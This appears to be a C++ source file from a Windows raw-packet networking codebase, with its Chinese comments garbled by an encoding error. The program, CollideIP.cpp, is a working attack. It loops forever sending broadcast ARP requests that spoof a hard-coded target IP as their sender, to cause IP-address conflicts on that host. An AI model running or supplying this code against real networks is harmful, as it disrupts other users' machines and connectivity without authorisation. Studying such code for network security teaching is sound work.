////////////////////////////////////////////////
// CollideIP.cpp�ļ�

#include "../common/initsock.h"

#include <windows.h>
#include <stdio.h>

#include "protoutils.h"
#include "ProtoPacket.h"

#include "Iphlpapi.h"
#pragma comment(lib, "Iphlpapi.lib")


DWORD WINAPI SendThread(LPVOID lpParam);
BOOL GetGlobalData();

/////////////////////////////////////////
// ȫ������
u_char	g_ucLocalMac[6];	// ����MAC��ַ
DWORD	g_dwGatewayIP;		// ����IP��ַ
DWORD	g_dwLocalIP;		// ����IP��ַ
DWORD	g_dwMask;			// ��������


CInitSock theSock;



void CollideTargetIP(CArpPacket *pArp, DWORD dwDestIP);

int main()
{
	// ��ȡȫ������
	GetGlobalData();
	// ��������
	if(!ProtoStartService())
	{
		printf(" ProtoStartService() failed %d \n", ::GetLastError());
		return -1;
	}
	// �򿪿����豸����
	HANDLE hControlDevice = ProtoOpenControlDevice();
	if(hControlDevice == INVALID_HANDLE_VALUE)
	{
		printf(" ProtoOpenControlDevice() failed() %d \n", ::GetLastError());
		ProtoStopService();
		return -1;
	}
	// ö�ٰ󶨵��²�������
	CPROTOAdapters adapters;
	if(!adapters.EnumAdapters(hControlDevice))
	{
		printf(" Enume adapter failed \n");
		ProtoStopService();
		return -1;
	}

	////////////////////////////////////////////////////////////////////////
	// ���濪ʼ����LANɨ��

	CAdapter adapter;
	// Ĭ��ʹ�õ�һ��������
	if(!adapter.OpenAdapter(adapters.m_pwszSymbolicLink[0], TRUE))
	{
		printf(" OpenAdapter failed \n");
		ProtoStopService();
		return -1;
	}

	CArpPacket arp(&adapter);
	CArpPacket *pArp = &arp;

/////////////////////////////////////////////////////////////////////////	

	// ��ɶԷ�IP��ַ��ͻ
	char szDestIP[] = "10.16.115.90";
	while(TRUE)
	{
		// pArp��һ���Ѿ���ʼ����CArpPacket�����ָ��
		CollideTargetIP(pArp, ::inet_addr(szDestIP));
		::Sleep(1000);
	}

	ProtoStopService();
	return 0;
}

void CollideTargetIP(CArpPacket *pArp, DWORD dwDestIP)
{
	// ��Ŀ��IP����һ��ARP���������ARP������е�ԴIP��ַ��dwDestIPһ��
	// ���ʹ�Է��������� IP��ַ��ͻ ϵͳ����
	u_char destmacEther[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	u_char destmacArp[6] = { 0 }; 

	pArp->SendPacket(destmacEther, g_ucLocalMac, 
			ARPOP_REQUEST, destmacEther, dwDestIP, g_ucLocalMac, dwDestIP); 
}

BOOL GetGlobalData()
{
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulLen = 0;

	// Ϊ�������ṹ�����ڴ�
	::GetAdaptersInfo(pAdapterInfo,&ulLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);

	// ȡ�ñ����������ṹ��Ϣ
	if(::GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
	{
		if(pAdapterInfo != NULL)
		{
			memcpy(g_ucLocalMac, pAdapterInfo->Address, 6);
			g_dwGatewayIP = ::inet_addr(pAdapterInfo->GatewayList.IpAddress.String);
			g_dwLocalIP = ::inet_addr(pAdapterInfo->IpAddressList.IpAddress.String);
			g_dwMask = ::inet_addr(pAdapterInfo->IpAddressList.IpMask.String);
		}
	}
	::GlobalFree(pAdapterInfo);

	printf(" \n -------------------- ����������Ϣ -----------------------\n\n");
	in_addr in;
	in.S_un.S_addr = g_dwLocalIP;
	printf("      IP Address : %s \n", ::inet_ntoa(in));

	in.S_un.S_addr = g_dwMask;
	printf("     Subnet Mask : %s \n", ::inet_ntoa(in));

	in.S_un.S_addr = g_dwGatewayIP;
	printf(" Default Gateway : %s \n", ::inet_ntoa(in));

	u_char *p = g_ucLocalMac;
	printf("     MAC Address : %02X-%02X-%02X-%02X-%02X-%02X \n", p[0], p[1], p[2], p[3], p[4], p[5]);

	printf(" \n \n ");

	return TRUE;
}
